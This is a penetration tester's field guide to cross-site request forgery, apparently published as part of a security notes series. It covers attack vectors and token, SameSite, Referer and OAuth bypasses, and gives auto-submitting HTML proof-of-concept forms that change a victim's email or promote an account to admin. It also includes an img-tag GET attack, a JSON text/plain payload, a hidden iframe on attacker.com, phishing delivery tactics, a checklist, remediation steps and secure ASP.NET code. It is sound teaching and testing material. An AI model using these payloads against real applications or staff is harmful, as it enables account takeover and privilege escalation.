# CSRF — Cross-Site Request Forgery — Enterprise Penetration Testing Field Notes

> **Author:** Dheeraj Kumar Jayaswal — Senior Penetration Tester | 6+ Years Enterprise AppSec
>
> **Category:** Broken Access Control — OWASP A01:2021
>
> **Severity:** Medium to Critical — scales directly with the sensitivity of the action being forged
>
> **Real-world impact:** CSRF is consistently present in enterprise internal applications. External apps have mostly adopted CSRF tokens and SameSite cookies. Internal tools — built quickly, used only by employees — routinely skip these protections entirely. One CSRF on a password change endpoint combined with a phishing email is a complete account takeover with zero technical interaction required from the attacker.

---

## 🧠 Why This Write-Up Exists

CSRF is one of the most underestimated vulnerabilities in enterprise engagements. It is often dismissed as theoretical because it requires social engineering — the victim must click a link or visit a page. In enterprise environments, that bar is extremely low. A convincing internal email, a link shared in Slack, a QR code on a printed notice — any of these can deliver a CSRF attack against employees who are already authenticated to internal tools.

I have found CSRF on password change, email change, admin privilege grant, and user deletion endpoints in enterprise internal applications. These were not public-facing applications — they were internal HR portals, finance dashboards, and IT management tools where the assumption was that "only employees use this, so it does not need CSRF protection."

That assumption is exactly why CSRF still appears in enterprise engagements in 2025.

---

## 📖 What Is CSRF?

CSRF exploits the fact that browsers automatically attach cookies to every request to a domain — regardless of which website initiated the request. An attacker's page can trigger a request to a target application, and the victim's browser will silently attach the session cookie, making the server believe it is a legitimate user-initiated request.

```
The three conditions required for CSRF to be exploitable:

  1. Cookie-based session management
     → The application uses cookies to track authenticated sessions
     → Browser auto-sends cookies on every request to that domain

  2. No unpredictable request parameter
     → No CSRF token, or token is not validated server-side
     → Request can be fully constructed by the attacker

  3. Relevant action exists
     → There is a state-changing action worth forging
     → Password change, email update, fund transfer, admin grant

If all three conditions are met → CSRF is exploitable
```

---

## 🔍 Phase 1 — Reconnaissance: Mapping the CSRF Surface

Before testing any payload, identify every state-changing action in the application and map its request structure.

### Actions Worth Testing for CSRF

```
Tier 1 — Critical impact if CSRF succeeds:
  POST /account/change-password          → full account takeover
  POST /account/change-email             → full account takeover (via reset)
  POST /admin/users/promote              → privilege escalation
  POST /admin/users/create               → backdoor admin account
  POST /api/payment/transfer             → financial loss
  POST /api/oauth/link                   → account linking = ATO

Tier 2 — High impact:
  POST /account/change-phone             → MFA bypass enablement
  POST /api/users/delete                 → account destruction
  POST /admin/config/update              → application misconfiguration
  POST /api/integrations/add-webhook     → data exfiltration channel

Tier 3 — Medium impact:
  POST /profile/update                   → data tampering
  POST /notifications/settings           → disruption
  POST /api/keys/generate                → API key creation = persistent access
```

### Burp Suite Workflow for CSRF Discovery

```
Step 1: Browse all application features as authenticated user
        Perform: password change, profile update, admin actions

Step 2: In Burp HTTP History — filter for POST/PUT/PATCH/DELETE requests
        These are the state-changing requests to test

Step 3: For each request — look for:
        ✓ CSRF token present?     → Is it actually validated?
        ✓ Custom header present?  → Is it checked server-side?
        ✓ SameSite cookie?        → Is it Strict/Lax or None?
        ✓ Origin/Referer checked? → Can it be bypassed?

Step 4: Right-click any POST request in Burp Pro →
        Engagement tools → Generate CSRF PoC
        (Burp auto-generates the HTML attack page)
```

---

## 💥 Phase 2 — Attack Vectors & Bypass Techniques

### Vector 1 — CSRF Token Not Present (No Protection)

The simplest and most common finding in enterprise internal applications.

```
Capture POST /account/change-email in Burp Repeater:

Original request:
POST /account/change-email HTTP/1.1
Host: internal.company.com
Cookie: session=eyJhbG...
Content-Type: application/x-www-form-urlencoded

email=dheeraj@company.com&confirm_email=dheeraj@company.com

No csrf_token parameter anywhere → build PoC immediately:

PoC HTML:
<!DOCTYPE html>
<html>
<body onload="document.getElementById('csrf').submit()">
  <form id="csrf" action="https://internal.company.com/account/change-email"
        method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="confirm_email" value="attacker@evil.com">
  </form>
</body>
</html>

Delivery: Send as email attachment → victim opens in browser while logged in
→ Email changed → attacker triggers "forgot password" → full ATO
```

### Vector 2 — CSRF Token Present but Not Validated

Token exists in the form but the server never checks it — the most embarrassing finding for a developer team.

```
Original request:
POST /account/change-password
Body: old_password=Curr3nt!&new_password=NewPass!&csrf_token=abc123xyz

Test 1 — Remove the token entirely:
Body: old_password=Curr3nt!&new_password=NewPass!
→ If 200 OK = token not validated at all

Test 2 — Send empty token:
Body: old_password=Curr3nt!&new_password=NewPass!&csrf_token=
→ If 200 OK = empty token accepted

Test 3 — Send random value:
Body: old_password=Curr3nt!&new_password=NewPass!&csrf_token=AAAAAAAAAA
→ If 200 OK = any value accepted, not validated

All three → CSRF token is cosmetic only → full CSRF exploitable
```

### Vector 3 — CSRF Token Not Tied to User Session

Token is validated but not tied to a specific user — any valid token works for any user.

```
Methodology:
Step 1: Log in as Attacker → perform a state-changing action
        → capture the csrf_token value: xyz789

Step 2: In your CSRF PoC, use Attacker's csrf_token
        instead of trying to steal Victim's token

Step 3: Deliver PoC to Victim
        → Victim's browser submits the form
        → Server receives: Victim's session cookie + Attacker's csrf_token
        → If 200 OK = token validated but not session-bound

Why this matters in enterprise:
Token pool shared across application → any authenticated user's token
works for any other user's actions → full CSRF despite token implementation
```

### Vector 4 — SameSite=None Cookie (Explicit Vulnerability)

```
Check the session cookie in Burp HTTP History → Set-Cookie header:

Vulnerable configurations:
Set-Cookie: session=eyJhbG...; SameSite=None; Secure
→ SameSite=None = browser sends cookie on cross-origin requests = CSRF works

Set-Cookie: session=eyJhbG...
→ No SameSite = older browsers default to None = CSRF works

Secure configuration:
Set-Cookie: session=eyJhbG...; SameSite=Strict; Secure; HttpOnly
→ SameSite=Strict = cookie not sent on any cross-origin request = CSRF blocked
→ SameSite=Lax = cookie sent only on top-level navigation GET = partial protection
```

### Vector 5 — POST to GET Method Switching

Some enterprise endpoints accept both GET and POST — allowing CSRF via a simple image tag or link, requiring no form submission.

```
Original action (POST):
POST /api/user/2/promote-to-admin
Body: role=admin

Test: Change to GET:
GET /api/user/2/promote-to-admin?role=admin

If GET works → trivial CSRF:
<img src="https://internal.company.com/api/user/2/promote-to-admin?role=admin">

This can be embedded in any HTML email, forum post, or chat message.
No JavaScript required. Fires on page load for every victim who views it.
```

### Vector 6 — JSON CSRF (Content-Type Bypass)

Modern APIs that use `Content-Type: application/json` often assume they are CSRF-safe because browsers send `text/plain` from HTML forms. This assumption has a bypass.

```
Normal CSRF PoC (HTML form) sends: Content-Type: application/x-www-form-urlencoded
JSON endpoint requires:            Content-Type: application/json

The bypass — if the endpoint accepts text/plain body as JSON:

<form id="csrf" action="https://api.company.com/settings" method="POST"
      enctype="text/plain">
  <input name='{"email":"attacker@evil.com","x":"' value='"}'>
</form>

This sends:
Content-Type: text/plain
Body: {"email":"attacker@evil.com","x":""}

If the server parses this as JSON regardless of Content-Type → CSRF works

Also test with fetch() in an XSS chain:
fetch('https://api.company.com/settings', {
  method: 'POST',
  body: JSON.stringify({email: 'attacker@evil.com'}),
  credentials: 'include'
})
→ If CORS misconfigured (Access-Control-Allow-Origin: *) = JSON CSRF works
```

### Vector 7 — Referer/Origin Header Bypass

Some applications validate CSRF by checking the Referer or Origin header instead of a token.

```
Bypass 1 — Referer contains target domain as subdirectory:
Referer: https://attacker.com/internal.company.com

Bypass 2 — Null Referer via sandboxed iframe:
<iframe sandbox="allow-scripts allow-forms"
        srcdoc='<form action="https://internal.company.com/settings"
                      method="POST">...<script>submit()</script>'>
</iframe>
Null Referer is sent → if application accepts null = bypass

Bypass 3 — Referer header absent:
Some proxy configurations and browser settings strip Referer headers
→ If application accepts missing Referer = bypass

Test: In Burp Repeater → remove the Referer header → send request
→ If 200 OK = Referer validation not enforced when header is absent
```

### Vector 8 — OAuth State Parameter Missing (CSRF + ATO)

A high-value finding specific to enterprise SSO and OAuth integrations.

```
Normal OAuth flow:
GET /oauth/authorize?client_id=X&redirect_uri=Y&state=RANDOM_CSRF_TOKEN

Step 1: State parameter is generated and stored in user's session
Step 2: After OAuth callback, state is verified against session value
Step 3: If state matches → OAuth flow is tied to legitimate user

Attack when state is missing or not validated:
Step 1: Attacker initiates OAuth with their own identity provider account
Step 2: Attacker receives callback URL: /oauth/callback?code=ATTACKER_CODE
Step 3: Attacker tricks victim into visiting this URL while authenticated
Step 4: Victim's session now linked to attacker's OAuth account
Step 5: Attacker logs in with their OAuth account → enters victim's session

Result: Full account takeover via CSRF-triggered OAuth account linking
Severity: Critical

Test:
1. Initiate OAuth login
2. Check if state= parameter exists in /authorize URL
3. If absent → OAuth CSRF possible
4. If present → try replaying with tampered/removed state value
```

> **Enterprise context:** I found an OAuth state parameter bypass in an enterprise SSO integration at a large technology company. The main application required CSRF tokens on all forms, but the OAuth callback endpoint `/auth/callback` was built separately (third-party SSO integration) and had no state validation. Linking this with a phishing email that directed users to a pre-crafted callback URL resulted in full account takeover without any password interaction.

---

## 🗂️ Phase 3 — Building & Delivering the PoC

### Universal CSRF PoC Template

```html
<!DOCTYPE html>
<html>
<head><title>CSRF PoC — Enterprise Pentest</title></head>
<body onload="document.getElementById('csrf-form').submit()">

  <form id="csrf-form"
        action="https://TARGET-APP.company.com/account/change-email"
        method="POST">

    <!-- Add all POST parameters the original request requires -->
    <input type="hidden" name="email" value="attacker@controlled.com">
    <input type="hidden" name="confirm_email" value="attacker@controlled.com">

    <!-- If there IS a CSRF token field but validation is broken: -->
    <!-- <input type="hidden" name="csrf_token" value="ATTACKER_OWN_TOKEN"> -->

  </form>

  <!-- Auto-submits immediately on page load -->
  <!-- Victim sees a blank page — no indication anything happened -->

</body>
</html>
```

### Delivering the PoC in an Enterprise Context

```
Method 1 — Internal phishing email (most realistic):
  Subject: "Action Required: Update your profile settings"
  Body: "Please click here to update your information"
  Link: points to attacker's hosted PoC page
  → Victim clicks → blank page → action executed silently

Method 2 — Internal wiki / intranet page:
  If attacker has edit access to internal wiki
  → Embed PoC as an invisible iframe
  <iframe src="https://attacker.com/csrf.html" style="display:none"></iframe>
  → Any employee who visits the wiki page triggers the action

Method 3 — XSS-CSRF chain (highest impact):
  If XSS exists anywhere in the application:
  → Use XSS to make the CSRF request in-origin
  → No SameSite cookie restriction (same origin = cookies sent)
  → No Referer check bypass needed
  → Bypasses all CSRF token defences if token is in DOM
  fetch('/account/change-email', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'email=attacker@evil.com',
    credentials: 'same-origin'
  })
```

---

## 📋 Systematic Testing Checklist

```
INITIAL MAPPING
☐ List all POST/PUT/PATCH/DELETE actions in application
☐ Categorise by impact: Critical / High / Medium
☐ Prioritise: password change, email change, admin actions, fund transfer

TOKEN VALIDATION TESTING
☐ Remove csrf_token entirely — does request succeed?
☐ Send empty csrf_token — does request succeed?
☐ Send random csrf_token value — does request succeed?
☐ Use your own (attacker's) valid token for victim's request — succeed?
☐ Reuse old token — is it still valid after use?

COOKIE SAMESITE CHECK
☐ Find Set-Cookie header in login response
☐ Is SameSite=Strict or Lax present?
☐ If SameSite=None or absent → cookie sent cross-origin = CSRF possible

METHOD SWITCHING
☐ Convert every POST action to GET — does server accept it?
☐ If yes → trivial CSRF via <img> tag

JSON ENDPOINT TESTING
☐ Does endpoint require Content-Type: application/json?
☐ Test with Content-Type: text/plain and JSON body
☐ Check CORS: does server return Access-Control-Allow-Origin: *?

HEADER VALIDATION
☐ Remove Referer header — does request succeed?
☐ Try Referer: https://attacker.com/TARGET-DOMAIN
☐ Try null Referer via sandboxed iframe

OAUTH/SSO FLOWS
☐ Does OAuth authorize URL include state= parameter?
☐ Is state validated on callback?
☐ Can you replay an old callback URL against a victim?
```

---

## 📋 Enterprise Pentest Report Template

---

**Finding Title:** CSRF on Admin User Promotion Endpoint — Privilege Escalation to Administrator

**Severity:** Critical

**CVSS v3.1 Score:** 8.8 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)

**Affected Endpoint:** `POST /admin/users/promote`

**Authentication Required:** Victim must be authenticated as an administrator

---

**Vulnerability Description:**

The admin user promotion endpoint does not implement CSRF protection. No CSRF token is required, the session cookie lacks the SameSite attribute, and the Origin header is not validated. An attacker can craft a malicious HTML page that, when visited by an authenticated administrator, silently promotes the attacker's account to administrator-level access.

---

**Steps to Reproduce:**

1. Create a standard user account: `attacker@company.com`
2. Note the user ID (e.g., `1337`) from the profile API response
3. Host the following PoC HTML on any web-accessible server
4. Send the URL to an authenticated administrator (via email or internal chat)
5. When the administrator loads the page, their browser auto-submits the form
6. Log in as `attacker@company.com` — administrator access confirmed

```html
<!-- CSRF PoC — hosted at https://attacker.com/csrf.html -->
<!DOCTYPE html>
<html>
<body onload="document.getElementById('f').submit()">
  <form id="f" action="https://internal.company.com/admin/users/promote"
        method="POST">
    <input type="hidden" name="user_id" value="1337">
    <input type="hidden" name="role" value="admin">
  </form>
</body>
</html>
```

---

**Proof of Concept:**

```
1. Attacker hosts csrf.html
2. Sends link to admin@company.com via internal email
3. Admin clicks link while authenticated to internal.company.com
4. Browser auto-submits POST /admin/users/promote with admin's session cookie
5. Response: HTTP 200 OK — user 1337 promoted to admin
6. Attacker logs into application → full administrator access confirmed
```

---

**Business Impact:**

- Any attacker with internal network access or email delivery capability can escalate any account to administrator
- Full access to all user data, configuration, and administrative functions
- No authentication credentials required — only social engineering of one administrator
- Attack is invisible — victim sees a blank page and is unaware the action occurred

---

**Remediation:**

| Priority | Action |
|---|---|
| Immediate | Implement synchroniser token pattern — unique CSRF token per session, validated server-side on every state-changing request |
| Immediate | Add `SameSite=Strict` to all session cookies |
| Short-term | Validate `Origin` header on all state-changing endpoints — reject requests where Origin does not match application domain |
| Short-term | Require re-authentication (current password) for all admin privilege changes |
| Long-term | Audit all POST/PUT/PATCH/DELETE endpoints for CSRF token enforcement |

---

**Secure Implementation Pattern (C# / ASP.NET Core):**

```csharp
// ✅ SECURE — ASP.NET Core built-in CSRF protection

// In Startup.cs / Program.cs:
services.AddAntiforgery(options => {
    options.HeaderName = "X-CSRF-TOKEN";   // for AJAX requests
    options.Cookie.SameSite = SameSiteMode.Strict;
    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
});

// In controller action — validate CSRF token:
[HttpPost]
[ValidateAntiForgeryToken]   // ← this attribute enforces CSRF token validation
public IActionResult PromoteUser(int userId, string role)
{
    // Action only proceeds if valid CSRF token present
}

// In Razor view — include token in form:
<form method="post">
    @Html.AntiForgeryToken()   // ← injects hidden CSRF token field
    <input type="hidden" name="user_id" value="@Model.UserId">
    <button type="submit">Promote</button>
</form>

// Session cookie — set SameSite in Program.cs:
builder.Services.ConfigureApplicationCookie(options => {
    options.Cookie.SameSite = SameSiteMode.Strict;
    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
    options.Cookie.HttpOnly = true;
});
```

---

## 🧪 Practice Labs

| Platform | Resource | Focus Area |
|---|---|---|
| [PortSwigger CSRF Labs](https://portswigger.net/web-security/csrf) | 12 free labs | Token bypass, SameSite, Referer bypass |
| [DVWA CSRF Module](https://github.com/digininja/DVWA) | Local safe lab | Basic CSRF testing |
| [HackTheBox Web Challenges](https://hackthebox.com) | Real-world scenarios | Chained CSRF attacks |

---

## 🧭 Key Takeaways From 6+ Years of Enterprise Testing

**1. Internal applications are the richest CSRF target.**
External applications have mostly adopted CSRF tokens under pressure from security reviews and bug bounty reports. Internal HR portals, IT management tools, and finance dashboards — built for internal use and never reviewed — consistently lack CSRF protection. These are always my first targets.

**2. The SameSite cookie attribute is a game changer — test for its absence.**
SameSite=Strict blocks CSRF completely for the vast majority of attack vectors. Before building a full PoC, always check the session cookie attributes. If SameSite is missing or set to None, CSRF is almost always viable regardless of token presence.

**3. Test token validation, not token presence.**
Many developers add a CSRF token to forms to satisfy a security checklist — but never add the server-side validation. Token present in the form ≠ token validated on the server. Always test by removing the token, emptying it, and replacing it with a random value. Any 200 response = token not validated.

**4. The XSS + CSRF chain is critical severity by design.**
A CSRF vulnerability on its own requires social engineering. Combined with any XSS in the application — even self-XSS — the chain becomes exploitable without victim interaction beyond normal browsing. When you find CSRF, always check if any XSS exists that could complete the chain in-origin.

**5. Report the realistic attack chain, not just the technical finding.**
"CSRF on password change endpoint" sounds moderate. "Attacker sends one internal email, administrator clicks the link, attacker's account is promoted to full admin access" is what the CISO needs to hear to authorise emergency patching. Always describe CSRF findings in terms of the complete attack scenario.

---

## 🔗 References

- [OWASP CSRF](https://owasp.org/www-community/attacks/csrf)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger CSRF Research](https://portswigger.net/web-security/csrf)
- [SameSite Cookie Explainer](https://web.dev/samesite-cookies-explained/)

---

<div align="center">

*Part of [AppSec From The Trenches](README.md) — Real notes from 6+ years of enterprise penetration testing.*

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Dheeraj%20Kumar%20Jayaswal-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://linkedin.com/in/dheerajkumarjayaswal)

</div>
